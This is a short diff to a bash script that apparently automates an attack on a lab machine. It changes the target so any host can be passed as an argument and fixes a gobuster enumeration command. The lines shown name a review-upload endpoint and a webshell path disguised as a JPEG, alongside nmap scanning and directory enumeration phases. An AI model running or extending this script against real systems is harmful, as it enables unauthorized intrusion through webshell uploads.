@@ -1,7 +1,7 @@
 #!/bin/bash
 set -e
 
-TARGET="192.168.56.101"
+TARGET="${1:-192.168.56.101}"
 
 UPLOAD_URL="http://${TARGET}/reviews.php"
 WEBSHELL_URL="http://${TARGET}/uploads/shell.php.jpg"
@@ -25,7 +25,7 @@ echo "[+] Nmap complete => $LOGS/autoscan.txt"
 
 # ===== Phase 2: Enumeration =====
 echo "[*] Phase 2: Enumeration"
-gobuster -u http://${TARGET}/ -w /usr/share/dirb/wordlists/common.txt -q -o "$LOGS/gobuster.txt" 2>/dev/null
+gobuster dir -u http://${TARGET}/ -w /usr/share/dirb/wordlists/common.txt -q -o "$LOGS/gobuster.txt" 2>/dev/null
 grep -q "uploads" "$LOGS/gobuster.txt" || { echo "[-] /uploads not found"; exit 1; }
 echo "[+] /uploads discovered via gobuster => $LOGS/gobuster.txt"
 
